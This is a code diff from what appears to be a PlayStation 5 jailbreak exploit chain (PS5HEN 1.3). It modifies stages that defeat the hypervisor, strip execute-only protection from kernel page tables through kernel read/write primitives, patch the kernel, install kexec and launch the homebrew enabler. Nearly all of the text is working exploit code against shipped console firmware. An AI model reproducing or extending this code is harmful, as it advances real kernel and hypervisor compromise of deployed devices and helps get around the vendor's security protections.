@@ -247,9 +247,7 @@ int stage3_patch_vmcbs(hv_defeat_ctx *ctx) {
 int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
     std::print("\n[stage3b] xotext removal\n");
 
-    //pin_to_first_available_core();
-
-    pin_to_core( 9 );
+    pin_to_first_available_core();
 
     uint64_t pmap = ctx->kbase + fw_off(ctx->fw, "OFF_PMAP_STORE");
     uint64_t read_2 = 0;
@@ -263,6 +261,9 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
     int n = 0;
 
     for (uint64_t a = start; a < end; a += 0x1000) {
+
+        std::print("VA to unlock : {:x}\n", a);
+
         uint64_t pde, pde_a = find_pde(pmap, a, &pde);
         if (pde_a != ~0ULL) {
             CLEAR_PDE_BIT(pde, XOTEXT); SET_PDE_BIT(pde, RW);
@@ -277,9 +278,9 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
             kernel_copyin(&pte, pte_a, sizeof(pte));
             uint64_t read3 = 0;
             kernel_copyout(pte_a, &read3, sizeof(read3));
-            std::print("Entry pte a: {:x} pte_a: {:x} write: {:016x} read: {:016x}\n", a, pte_a, pte, read3);
-            n++;
+            std::print("Entry pte a: {:x} pte_a: {:x} write: {:016x} read: {:016x}\n\n", a, pte_a, pte, read3);
         }
+        n++;
     }
     std::print("  {} pages\n", n);
     return 0;
@@ -287,12 +288,10 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
 
 
 int stage4_verify(hv_defeat_ctx *ctx) {
-    usleep(200000);
+    usleep(10000000);
     std::print("\n[stage4] verify\n");
 
-    pin_to_core( 9 );
-
-    //pin_to_first_available_core();
+    pin_to_first_available_core();
 
     uint64_t ktext = kr8((uint64_t)KERNEL_ADDRESS_TEXT_BASE);
     //uint64_t hvdata = kr8(ctx->hv_data_va);
@@ -535,23 +534,25 @@ int run_hv_defeat(void) { //uint64_t mp4_softc, uint64_t zcn_bar2) {
 
     if ((r = stage3b_remove_xotext(&ctx))) return r;
 
-    stage4_verify(&ctx);
+    if (true) {
+        stage4_verify(&ctx);
 
-    stage5_patch_kernel(&ctx);
+        stage5_patch_kernel(&ctx);
 
-    usleep(10000);
+        usleep(10000);
 
-    if ((r = stage6_install_kexec(&ctx))) return r;
+        if ((r = stage6_install_kexec(&ctx))) return r;
 
-    flush_tlb_all_cores(&ctx);
+        flush_tlb_all_cores(&ctx);
+    }
 
-    // usleep(100000);
+    usleep(100000);
     
-    // stage7_run_hen(&ctx);
+    stage7_run_hen(&ctx);
 
-    // uint32_t fw_ver = kernel_get_fw_version();
-    // notify(std::format("Welcome To PS5HEN 1.3\nPlayStation 5 FW: {:d}.{:02d}\nBy SpecterDev, f0f, flat_z",
-    //     (fw_ver >> 24) & 0xFF, (fw_ver >> 16) & 0xFF));
+    uint32_t fw_ver = kernel_get_fw_version();
+    notify(std::format("Welcome To PS5HEN 1.3\nPlayStation 5 FW: {:d}.{:02d}\nBy SpecterDev, f0f, flat_z",
+        (fw_ver >> 24) & 0xFF, (fw_ver >> 16) & 0xFF));
 
     return 0;
 }
